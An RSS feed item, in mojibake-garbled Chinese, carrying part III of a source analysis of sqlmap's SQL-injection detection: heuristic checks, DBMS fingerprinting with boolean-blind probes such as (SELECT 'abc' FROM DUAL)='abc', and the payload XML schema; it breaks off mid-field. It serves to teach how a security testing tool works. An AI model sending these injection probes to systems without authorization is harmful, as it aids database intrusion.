<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>é•¿äº­æŠ€æœ¯ä¸“æ </title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
<description></description>
<language>zh-cn</language>
<lastBuildDate>Sat, 29 Sep 2018 22:05:03 +0800</lastBuildDate>
<item>
<title>sqlmap å†…æ ¸åˆ†æ III: æ ¸å¿ƒé€»è¾‘</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-09-25-45291193.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/45291193&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ab4b5d32ff7b3377b7dbe60c6c96676a_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;ä½œè€…ï¼š &lt;a href=&quot;https://www.zhihu.com/people/af8bd4cc442c1349ed0f46baff19e3fd&quot;&gt;@v1ll4n&lt;/a&gt;&lt;/p&gt;&lt;p&gt;å®‰å…¨ç ”å‘å·¥ç¨‹å¸ˆï¼Œç°å°±èŒäºé•¿äº­ç§‘æŠ€ï¼Œå–œæ¬¢å–µå–µ&lt;/p&gt;&lt;p&gt;æœ¬æ–‡çš„å†…å®¹å¯èƒ½æ˜¯å¤§å®¶æœ€æœŸå¾…çš„éƒ¨åˆ†ï¼Œä½†æ˜¯å¯èƒ½å¹¶ä¸æ¨èå¤§å®¶ç›´æ¥é˜…è¯»æœ¬ç¯‡æ–‡ç« ï¼Œå› ä¸ºå¤ªå¤šåŸç†æ€§å’Œæ•´ä½“é€»è¾‘ä¸Šçš„ä¸œè¥¿æ•£è§å‰ä¸¤ç¯‡æ–‡ç« ï¼Œç›´æ¥é˜…è¯»æœ¬æ–‡å¯èƒ½ä¼šæœ‰ä¸€äº›éš¾ä»¥é¢„æ–™çš„å›°éš¾ã€‚ï¼šï¼‰&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x00 å‰è¨€&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;ä¸Šä¸€ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬ä»‹ç»äº†é¡µé¢ç›¸ä¼¼åº¦ç®—æ³•ä»¥åŠ sqlmap å¯¹äºé¡µé¢ç›¸ä¼¼çš„åˆ¤å®šè§„åˆ™ï¼ŒåŒæ ·ä¹Ÿè·Ÿå…¥äº† sqlmap çš„ä¸€äº›é¢„å¤„ç†æ ¸å¿ƒå‡½æ•°ã€‚åœ¨æ¥ä¸‹æ¥çš„éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬ä¼šç›´æ¥å¼€å§‹ sqlmap çš„æ ¸å¿ƒæ£€æµ‹é€»è¾‘çš„åˆ†æï¼Œä¸»è¦æ¶‰åŠåˆ°ä»¥ä¸‹æ–¹é¢ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;heuristicCheckSqlInjection&lt;/code&gt; å¯å‘å¼ SQL æ³¨å…¥æ£€æµ‹ï¼ˆåŒ…æ‹¬ç®€å•çš„ XSS FI åˆ¤æ–­ï¼‰&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;checkSqlInjection&lt;/code&gt; SQL æ³¨å…¥æ£€æµ‹&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;0x01 heuristicCheckSqlInjection&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;è¿™ä¸ªå‡½æ•°ä½äº &lt;code class=&quot;inline&quot;&gt;controller.py&lt;/code&gt; çš„ &lt;code class=&quot;inline&quot;&gt;start()&lt;/code&gt; å‡½æ•°ä¸­ï¼ŒåŒæ—¶æˆ‘ä»¬åœ¨æ•´ä½“é€»è¾‘ä¸­ä¹Ÿæ˜ç¡®æŒ‡æ˜äº†è¿™ä¸€ä¸ªæ­¥éª¤ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-09948b0ca58809429e56dd2310d5ec2f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;611&quot; data-rawheight=&quot;446&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-09948b0ca58809429e56dd2310d5ec2f&quot; data-watermark-src=&quot;v2-f7f32b45d24eb8d0e6f2e09462767fd1&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;è¿™æ ‡çº¢çš„ä¸¤ä¸ªæ­¥éª¤å…¶å®å°±æ˜¯æœ¬ç¯‡æ–‡ç« ä¸»è¦éœ€è¦åˆ†æçš„ä¸¤ä¸ªéƒ¨åˆ†ï¼Œæ¶‰åŠåˆ° sqlmap æ£€æµ‹ sql æ³¨å…¥æ¼æ´çš„æ ¸å¿ƒé€»è¾‘ã€‚å…¶ä¸­ &lt;code class=&quot;inline&quot;&gt;heuristicCheckSqlInjection&lt;/code&gt; æ˜¯æˆ‘ä»¬æœ¬èŠ‚éœ€è¦åˆ†æçš„é—®é¢˜ã€‚è¿™ä¸ªå‡½æ•°çš„æ‰§è¡Œä½ç½®å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c98c16df1617579e51f1f913f6fb3133_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1230&quot; data-rawheight=&quot;665&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c98c16df1617579e51f1f913f6fb3133&quot; data-watermark-src=&quot;v2-1e909895c30fa2ec191a9ea45e811a07&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;å†ä¸Šå›¾ä»£ç ä¸­ï¼Œ2æ ‡å·ä¸ºå…¶ä½ç½®ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;å¯å‘å¼ sql æ³¨å…¥æ£€æµ‹æ•´ä½“é€»è¾‘&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;é€šè¿‡åˆ†æå…¶æºä»£ç ï¼Œç¬”è€…å…ˆè¡Œæ•´ç†å‡ºä»–çš„é€»è¾‘ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7da991a0edce2a8f194655c662947172_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;1276&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7da991a0edce2a8f194655c662947172&quot; data-watermark-src=&quot;v2-ca8b016586a9ac0cb1dd4a3db315e29c&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;æ ¹æ®æˆ‘ä»¬æ•´ç†å‡ºçš„å¯å‘å¼æ£€æµ‹æµç¨‹å›¾ï¼Œæˆ‘ä»¬åšå¦‚ä¸‹è¡¥å……è¯´æ˜ã€‚&lt;/p&gt;&lt;ol&gt;&lt;li&gt;è¿›è¡Œå¯å‘å¼ sql æ³¨å…¥æ£€æµ‹çš„å‰ææ¡ä»¶æ˜¯æ²¡æœ‰å¼€å¯   &lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; å¹¶ä¸”é¡µé¢å¹¶ä¸æ˜¯ &lt;code class=&quot;inline&quot;&gt;heavilyDynamic&lt;/code&gt;ã€‚å…³äºè¿™ä¸¤ä¸ªå±æ€§ï¼Œæˆ‘ä»¬åœ¨ç¬¬äºŒç¯‡æ–‡ç« ä¸­éƒ½æœ‰ç›¸å…³ä»‹ç»ï¼Œå¯¹äº &lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; æŒ‡çš„æ˜¯ä¸€ç§ä¸éœ€è¦çŸ¥é“ä»–çš„å…·ä½“å†…å®¹å°±å¯ä»¥çŸ¥é“æ•´ä¸ªå†…å®¹å¤§å°çš„è¯·æ±‚æ–¹æ³•ï¼›&lt;code class=&quot;inline&quot;&gt;heavilyDynamic&lt;/code&gt; æŒ‡çš„æ˜¯ï¼Œåœ¨ä¸æ”¹å˜ä»»ä½•å‚æ•°çš„æƒ…å†µä¸‹ï¼Œè¯·æ±‚ä¸¤æ¬¡é¡µé¢ï¼Œä¸¤æ¬¡é¡µé¢çš„ç›¸ä¼¼åº¦ä½äº 0.98ã€‚&lt;/li&gt;&lt;li&gt;åœ¨å®é™…çš„ä»£ç ä¸­ï¼Œå†³å®šæ³¨å…¥çš„ç»“æœæŠ¥å‘Šçš„ï¼Œä¸»è¦åœ¨äºä¸¤ä¸ªæ ‡è¯†ä½ï¼Œåˆ†åˆ«ä¸ºï¼š&lt;code class=&quot;inline&quot;&gt;casting&lt;/code&gt; ä¸ &lt;code class=&quot;inline&quot;&gt;result&lt;/code&gt;ã€‚ç¬”è€…åœ¨ä¸‹æ–¹åšä»£ç æ‰¹æ³¨å’Œè¯´æ˜ï¼š&lt;/li&gt;&lt;/ol&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-65ac833460ef8e12ff6daaabc9877f78_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2280&quot; data-rawheight=&quot;716&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-65ac833460ef8e12ff6daaabc9877f78&quot; data-watermark-src=&quot;v2-e4cb4750c314ba6f8aae4f8641ca9f82&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;3.&lt;code class=&quot;inline&quot;&gt; casting&lt;/code&gt; è¿™ä¸ªæ ‡è¯†ä½ä¸»è¦å–å†³äºä¸¤ç§æƒ…å†µï¼šç¬¬ä¸€ç§åœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚å°±å‘ç°å­˜åœ¨äº†ç‰¹å®šçš„ç±»å‹æ£€æŸ¥çš„è¿¹è±¡ï¼›ç¬¬äºŒç§æ˜¯åœ¨è¯·æ±‚å°æ•°æƒ…å†µçš„æ—¶å€™ï¼Œå‘ç°å°æ•°è¢«å¼ºè¡Œè½¬æ¢ä¸ºæ•´æ•°ã€‚é€šå¸¸å¯¹äºè¿™ç§é—®é¢˜ï¼Œåœ¨ä¸è€ƒè™‘ tamper çš„æƒ…å†µä¸‹ï¼Œä¸€èˆ¬å¾ˆéš¾æ£€æµ‹å‡ºæˆ–è€…ç»•è¿‡ã€‚&lt;/p&gt;&lt;p&gt;4. &lt;code class=&quot;inline&quot;&gt;result&lt;/code&gt; è¿™ä¸ªæ ‡è¯†ä½å–å†³äºï¼šå¦‚æœæ£€æµ‹å‡º DBMS é”™è¯¯ï¼Œåˆ™ä¼šè®¾ç½®è¿™ä¸ªæ ‡è¯†ä½ä¸º Trueï¼›å¦‚æœå‡ºç°äº†æ•°æ®åº“æ‰§è¡Œæ•°å€¼è¿ç®—ï¼Œä¹Ÿç½®ä¸º Trueã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;XSS ä¸ FI&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;å®é™…ä¸Šåœ¨å¯å‘å¼ sql æ³¨å…¥æ£€æµ‹å®Œæ¯•ä¹‹åï¼Œä¼šæ‰§è¡Œå…¶ä»–çš„æ£€æµ‹ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e8d011c2b1307283c0d6b53e47775df8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1644&quot; data-rawheight=&quot;870&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e8d011c2b1307283c0d6b53e47775df8&quot; data-watermark-src=&quot;v2-53ef9a98611b8aa91bb8e7ff7ee54e1f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;ol&gt;&lt;li&gt;æ£€æµ‹ XSS çš„æ–¹æ³•å…¶å®å°±æ˜¯æ£€æŸ¥ &lt;code class=&quot;inline&quot;&gt;&quot;&amp;lt;&#39;\&quot;&amp;gt;&quot;&lt;/code&gt;ï¼Œæ˜¯å¦å‡ºç°åœ¨äº†ç»“æœä¸­ã€‚ä½œä¸ºæ‰©å±•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ­¤æ£€æŸ¥æ˜¯å¦éšæœºå­—ç¬¦ä¸²è¿˜åœ¨é¡µé¢ä¸­ï¼Œä»è€Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨ XSS çš„è¿¹è±¡ã€‚&lt;/li&gt;&lt;li&gt;æ£€æµ‹ FIï¼ˆæ–‡ä»¶åŒ…å«ï¼‰ï¼Œå°±æ˜¯æ£€æµ‹ç»“æœä¸­æ˜¯å¦åŒ…å«äº† &lt;code class=&quot;inline&quot;&gt;include/require&lt;/code&gt; ç­‰æŠ¥é”™ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯æ˜¯é€šè¿‡ç‰¹å®šæ­£åˆ™è¡¨è¾¾å¼æ¥åŒ¹é…æ£€æµ‹çš„ã€‚&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;0x02 checkSqlInjection&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;è¿™ä¸ªå‡½æ•°å¯ä»¥è¯´æ˜¯ sqlmap ä¸­æœ€æ ¸å¿ƒçš„å‡½æ•°äº†ã€‚åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œå¤„ç†äº† Payload çš„å„ç§ç»†èŠ‚å’Œæµ‹è¯•ç”¨ä¾‹çš„å„ç§ç»†èŠ‚ã€‚&lt;/p&gt;&lt;p&gt;å¤§è‡´æ‰§è¡Œæ­¥éª¤åˆ†ä¸ºå¦‚ä¸‹å‡ ä¸ªå¤§éƒ¨åˆ†ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;æ ¹æ®å·²çŸ¥å‚æ•°ç±»å‹ç­›é€‰ boundary&lt;/li&gt;&lt;li&gt;å¯å‘å¼æ£€æµ‹æ•°æ®åº“ç±»å‹ &lt;code class=&quot;inline&quot;&gt;heuristicCheckDbms&lt;/code&gt;&lt;/li&gt;&lt;li&gt;payload é¢„å¤„ç†ï¼ˆUNIONï¼‰&lt;/li&gt;&lt;li&gt;è¿‡æ»¤ä¸æ’é™¤ä¸åˆé€‚çš„æµ‹è¯•ç”¨ä¾‹&lt;/li&gt;&lt;li&gt;å¯¹ç­›é€‰å‡ºçš„è¾¹ç•Œè¿›è¡Œéå†ä¸ payload æ•´åˆ&lt;/li&gt;&lt;li&gt;payload æ¸²æŸ“&lt;/li&gt;&lt;li&gt;é’ˆå¯¹å››ç§ç±»å‹çš„æ³¨å…¥åˆ†åˆ«è¿›è¡Œ response çš„å“åº”å’Œå¤„ç†&lt;/li&gt;&lt;li&gt;å¾—å‡ºç»“æœï¼Œè¿”å›ç»“æœ&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;ä¸‹å›¾æ˜¯ç¬”è€…æŠ˜å æ— å…³ä»£ç ä¹‹åå‰©ä½™çš„æœ€æ ¸å¿ƒçš„å¾ªç¯å’Œæ¡ä»¶åˆ†æ”¯ï¼Œæˆ‘ä»¬å‘ç°ä»–å…³äº &lt;code class=&quot;inline&quot;&gt;injectable&lt;/code&gt; çš„è®¾ç½®å®Œå…¨æ˜¯é€šè¿‡ &lt;code class=&quot;inline&quot;&gt;if method == PAYLOAD.METHOD.[COMPARISON/GREP/TIME/UNION]&lt;/code&gt; è¿™å‡ ä¸ªæ¡ä»¶åˆ†æ”¯å»å¤„ç†çš„ï¼ŒåŒæ—¶è¿™äº›æ¡ä»¶æ˜¾ç„¶æ˜¯ sqlmap é’ˆå¯¹ä¸åŒçš„æ³¨å…¥ç±»å‹çš„ Payload è¿›è¡Œè‡ªå·±çš„ç»“æœå¤„ç†é€»è¾‘é¥¿å’Œåˆ¤æ–­é€»è¾‘ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-1ff54b5a86ad202b1b2b0d770c262eb7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1774&quot; data-rawheight=&quot;1312&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-1ff54b5a86ad202b1b2b0d770c262eb7&quot; data-watermark-src=&quot;v2-8fb80e21a653bfa7afbdc16fa7221498&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;æ•°æ®åº“ç±»å‹æ£€æµ‹ heuristicCheckDbms&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;æˆ‘ä»¬åœ¨æœ¬å¤§èŠ‚åˆšå¼€å§‹çš„æ—¶å€™ï¼Œå°±å·²ç»è¯´æ˜äº†ç¬¬äºŒæ­¥æ˜¯ç¡®å®šæ•°æ®åº“çš„ç±»å‹ï¼Œé‚£ä¹ˆæ•°æ®åº“ç±»å‹æ¥æºäºç”¨æˆ·è®¾å®šæˆ–è€…è‡ªåŠ¨æ£€æµ‹ï¼Œå½“æˆªæ­¢ç¬¬äºŒæ­¥ä¹‹å‰è¿˜æ²¡æœ‰åŠæ³•ç¡®å®šæ•°æ®åº“ç±»å‹çš„æ—¶å€™ï¼Œå°±ä¼šè‡ªåŠ¨å¯åŠ¨ &lt;code class=&quot;inline&quot;&gt;heuristicCheckDbms&lt;/code&gt; è¿™ä¸ªå‡½æ•°ï¼Œåˆ©ç”¨ä¸€äº›ç®€å•çš„æµ‹è¯•æ¥ç¡®å®šæ•°æ®åº“ç±»å‹ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b1c6a11d5b3a8a023cf5a4444675e1d9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1229&quot; data-rawheight=&quot;652&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-b1c6a11d5b3a8a023cf5a4444675e1d9&quot; data-watermark-src=&quot;v2-5c4556182c1195c912df953e4c08951f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;å…¶å®è¿™ä¸ªæ­¥éª¤éå¸¸ç®€å•ï¼Œæ ¸å¿ƒåŸç†æ˜¯åˆ©ç”¨ç®€å•çš„å¸ƒå°”ç›²æ³¨æ„é€ ä¸€ä¸ª &lt;code class=&quot;inline&quot;&gt;(SELECT &quot;[RANDSTR]&quot; [FROM_DUMMY_TABLE.get(dbms)] )=&quot;[RANDSTR1]&quot;&lt;/code&gt; å’Œ &lt;code class=&quot;inline&quot;&gt;(SELECT &#39;[RANDSTR]&#39; [FROM_DUMMY_TABLE.get(dbms)] )=&#39;[RANDSTR1]&#39;&lt;/code&gt; è¿™ä¸¤ä¸ª Payload çš„è¯·æ±‚åˆ¤æ–­ã€‚å…¶ä¸­&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;FROM_DUMMY_TABLE = {
    DBMS.ORACLE: &quot; FROM DUAL&quot;,
    DBMS.ACCESS: &quot; FROM MSysAccessObjects&quot;,
    DBMS.FIREBIRD: &quot; FROM RDB$DATABASE&quot;,
    DBMS.MAXDB: &quot; FROM VERSIONS&quot;,
    DBMS.DB2: &quot; FROM SYSIBM.SYSDUMMY1&quot;,
    DBMS.HSQLDB: &quot; FROM INFORMATION_SCHEMA.SYSTEM_USERS&quot;,
    DBMS.INFORMIX: &quot; FROM SYSMASTER:SYSDUAL&quot;
}&lt;/code&gt;&lt;p&gt;ä¾‹å¦‚ï¼Œæ£€æŸ¥æ˜¯å¦æ˜¯ ORACLE çš„æ—¶å€™ï¼Œå°±ä¼šç”Ÿæˆ &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
(SELECT &#39;abc&#39; FROM DUAL)=&#39;abc&#39; 
(SELECT &#39;abc&#39; FROM DUAL)=&#39;abcd&#39;&lt;/code&gt;&lt;p&gt;è¿™æ ·çš„ä¸¤ä¸ª Payloadï¼Œå¦‚æœç¡®å®å­˜åœ¨æ­£è´Ÿå…³ç³»ï¼ˆå…·ä½“å†…å®¹å‚è§åç»­ç« èŠ‚çš„å¸ƒå°”ç›²æ³¨æ£€æµ‹ï¼‰ï¼Œåˆ™è¡¨æ˜æ•°æ®åº“å°±æ˜¯ ORACLEã€‚&lt;/p&gt;&lt;p&gt;å½“ç„¶æ•°æ®åº“ç±»å‹æ£€æµ‹å¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œå› ä¸º sqlmap å®é™…å·¥ä½œä¸­ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®š DBMS åˆ™ä¼šæŒ‰ç…§å½“å‰æµ‹è¯• Payload çš„å¯¹åº”çš„æ•°æ®åº“ç±»å‹å»è®¾ç½®ã€‚&lt;/p&gt;&lt;p&gt;å®é™…ä¸Šåœ¨å„ç§ Payload çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¼šåŒ…å«ç€ä¸€äº›æ•°æ®åº“çš„æ¨æ–­ä¿¡æ¯(&lt;code class=&quot;inline&quot;&gt;&amp;lt;details&amp;gt;&lt;/code&gt;)ï¼Œå¦‚æœ Payload æˆåŠŸæ‰§è¡Œï¼Œè¿™äº›ä¿¡æ¯å¯ä»¥è¢«é¡ºåˆ©æ¨æ–­åˆ™æ•°æ®åº“ç±»å‹å°±å¯ä»¥æ¨æ–­å‡ºæ¥ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;æµ‹è¯•æ•°æ®æ¨¡å‹ä¸ Payload ä»‹ç»&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;åœ¨å®é™…çš„ä»£ç ä¸­ï¼Œ&lt;code class=&quot;inline&quot;&gt;checkSqlInjection&lt;/code&gt; æ˜¯ä¸€ä¸ªæ¥è¿‘ä¸ƒç™¾è¡Œçš„å‡½æ•°ã€‚å½“ç„¶å…¶è¡Œä¸ºä¹Ÿå¹¶ä¸æ˜¯ä»…ä»…é€šè¿‡æˆ‘ä»¬ä¸Šé¢åˆ—å‡ºçš„æ­¥éª¤å°±å¯ä»¥å®Œå…¨æ¦‚æ‹¬çš„ï¼Œå…¶ä¸­æ¶‰åŠåˆ°äº†å¾ˆå¤šå…³äº Payload å®šä¹‰ä¸­å­—æ®µçš„æ“ä½œã€‚æ˜¾ç„¶ï¼Œç›´åˆ°ç°åœ¨æˆ‘ä»¬éƒ½å¹¶ä¸æ˜¯ç‰¹åˆ«äº†è§£ä¸€ä¸ª Payload ä¸­å­˜åœ¨ç€ä»€ä¹ˆæ ·çš„å®šä¹‰ï¼Œå½“ç„¶ä¹Ÿä¸ä¼šæ‡‚å¾—è¿™äº›æ“ä½œå¯¹äºè¿™äº›å­—æ®µåˆ°åº•æœ‰ä»€ä¹ˆå…·ä½“çš„æ„ä¹‰ã€‚æ‰€ä»¥æˆ‘ä»¬æ²¡æœ‰åŠæ³•åœ¨ä¸äº†è§£çœŸæ­£ Payload çš„æ—¶å€™å¼€å§‹ä¹‹åçš„æ­¥éª¤ã€‚&lt;/p&gt;&lt;p&gt;å› æ­¤åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬ä¼šè¯¦ç»†ä»‹ç»å…³äºå…·ä½“æµ‹è¯• Payload çš„æ•°æ®æ¨¡å‹ï¼Œå¹¶ä¸”åŸºäºè¿™äº›æ¨¡å‹å’Œæºç åˆ†æ sqlmap å®é™…çš„è¡Œä¸ºï¼Œå’Œ sql æ³¨å…¥åŸç†çš„ç»†èŠ‚çŸ¥è¯†ã€‚   Â·&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&amp;lt;test&amp;gt; é€šç”¨æ¨¡å‹&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;å…³äºé€šç”¨æ¨¡å‹å…¶å®åœ¨ sqlmap ä¸­æœ‰éå¸¸è¯¦ç»†çš„è¯´æ˜ï¼Œä½ç½®åœ¨ &lt;code class=&quot;inline&quot;&gt;xml/payloads/boolean_blind.xml&lt;/code&gt; ä¸­ï¼Œæˆ‘ä»¬æŠŠä»–ä»¬åˆ†éš”å¼€åˆ†åˆ«æ¥è®²è§£å…·ä½“å­—æ®µå¯¹åº”çš„ä»£ç çš„è¡Œä¸ºã€‚&lt;/p&gt;&lt;p&gt;é¦–å…ˆæˆ‘ä»¬å¿…é¡»æ˜ç™½ä¸€ä¸ªå…·ä½“çš„ testcase å¯¹åº”ä¸€ä¸ªå…·ä½“çš„ xml å…ƒç´ æ˜¯ä»€ä¹ˆæ ·å­ï¼š&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;
&amp;lt;test&amp;gt;
    &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;
    &amp;lt;stype&amp;gt;&amp;lt;/stype&amp;gt;
    &amp;lt;level&amp;gt;&amp;lt;/level&amp;gt;
    &amp;lt;risk&amp;gt;&amp;lt;/risk&amp;gt;
    &amp;lt;clause&amp;gt;&amp;lt;/clause&amp;gt;
    &amp;lt;where&amp;gt;&amp;lt;/where&amp;gt;
    &amp;lt;vector&amp;gt;&amp;lt;/vector&amp;gt;
    &amp;lt;request&amp;gt;
        &amp;lt;payload&amp;gt;&amp;lt;/payload&amp;gt;
        &amp;lt;comment&amp;gt;&amp;lt;/comment&amp;gt;
        &amp;lt;char&amp;gt;&amp;lt;/char&amp;gt;
        &amp;lt;columns&amp;gt;&amp;lt;/columns&amp;gt;
    &amp;lt;/request&amp;gt;
    &amp;lt;response&amp;gt;
        &amp;lt;comparison&amp;gt;&amp;lt;/comparison&amp;gt;
        &amp;lt;grep&amp;gt;&amp;lt;/grep&amp;gt;
        &amp;lt;time&amp;gt;&amp;lt;/time&amp;gt;
        &amp;lt;union&amp;gt;&amp;lt;/union&amp;gt;
    &amp;lt;/response&amp;gt;
    &amp;lt;details&amp;gt;
        &amp;lt;dbms&amp;gt;&amp;lt;/dbms&amp;gt;
        &amp;lt;dbms_version&amp;gt;&amp;lt;/dbms_version&amp;gt;
        &amp;lt;os&amp;gt;&amp;lt;/os&amp;gt;
    &amp;lt;/details&amp;gt;
&amp;lt;/test&amp;gt;&lt;/code&gt;&lt;p&gt;å…³äºä¸Šé¢çš„ä¸€ä¸ª &lt;code class=&quot;inline&quot;&gt;&amp;lt;test&amp;gt;&lt;/code&gt; æ ‡ç­¾å†…çš„å…ƒç´ éƒ½æ˜¯å®é™…ä¸ŠåŒ…å«çš„ä¸åªæ˜¯ä¸€ä¸ª Payload è¿˜åŒ…å«&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
Sub-tag: &amp;lt;title&amp;gt;
    Title of the test. æµ‹è¯•çš„åç§°ï¼Œè¿™äº›åç§°å°±æ˜¯æˆ‘ä»¬å®é™…åœ¨æµ‹è¯•çš„æ—¶å€™è¾“å‡ºçš„æ—¥å¿—ä¸­çš„å†…å®¹&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-11a7571b205d2558989f6054596e05cb_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;768&quot; data-rawheight=&quot;285&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-11a7571b205d2558989f6054596e05cb&quot; data-watermark-src=&quot;v2-e0b5748a512d87cfb212898eb0a3b017&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;ä¸Šå›¾è¡¨ç¤ºä¸€ä¸ª &lt;code class=&quot;inline&quot;&gt;&amp;lt;test&amp;gt;&lt;/code&gt; ä¸­çš„ title ä¼šè¢«è¾“å‡ºä½œä¸ºè°ƒè¯•ä¿¡æ¯ã€‚&lt;/p&gt;&lt;p&gt;é™¤éå¿…è¦çš„å­æ ‡ç­¾ï¼Œç¬”è€…å°†ä¼šç›´æ¥æŠŠæ ‡æ³¨å†™åœ¨ä¸‹é¢çš„ä»£ç å—ä¸­ï¼Œ&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Sub-tag: &amp;lt;stype&amp;gt;
    SQL injection family type. è¡¨ç¤ºæ³¨å…¥çš„ç±»å‹ã€‚
â€‹
    Valid values:
        1: Boolean-based blind SQL injection
        2: Error-based queries SQL injection
        3: Inline queries SQL injection
        4: Stacked queries SQL injection
        5: Time-based blind SQL injection
        6: UNION query SQL injection
â€‹
Sub-tag: &amp;lt;level&amp;gt;
    From which level check for this test. æµ‹è¯•çš„çº§åˆ«
â€‹
    Valid values:
        1: Always (&amp;lt;100 requests)
        2: Try a bit harder (100-200 requests)
        3: Good number of requests (200-500 requests)
        4: Extensive test (500-1000 requests)
        5: You have plenty of time (&amp;gt;1000 requests)
â€‹
Sub-tag: &amp;lt;risk&amp;gt;
    Likelihood of a payload to damage the data integrity.è¿™ä¸ªé€‰é¡¹è¡¨æ˜å¯¹ç›®æ ‡æ•°æ®åº“çš„æŸåç¨‹åº¦ï¼Œrisk æœ€é«˜ä¸‰çº§ï¼Œæœ€é«˜ç­‰çº§ä»£è¡¨å¯¹æ•°æ®åº“å¯èƒ½ä¼šæœ‰å±é™©çš„â€¢æ“ä½œï¼Œæ¯”å¦‚ä¿®æ”¹ä¸€äº›æ•°æ®ï¼Œæ’å…¥ä¸€äº›æ•°æ®ç”šè‡³åˆ é™¤ä¸€äº›æ•°æ®ã€‚
â€‹
    Valid values:
        1: Low risk
        2: Medium risk
        3: High risk
â€‹
Sub-tag: &amp;lt;clause&amp;gt;
    In which clause the payload can work. è¿™ä¸ªå­—æ®µè¡¨æ˜ &amp;lt;test&amp;gt; å¯¹åº”çš„æµ‹è¯• Payload é€‚ç”¨äºå“ªç§ç±»å‹çš„ SQL è¯­å¥ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå¾ˆå¤šè¯­å¥å¹¶ä¸ä¸€å®šéè¦ç‰¹å®š WHERE ä½ç½®çš„ã€‚
â€‹
    NOTE: for instance, there are some payload that do not have to be
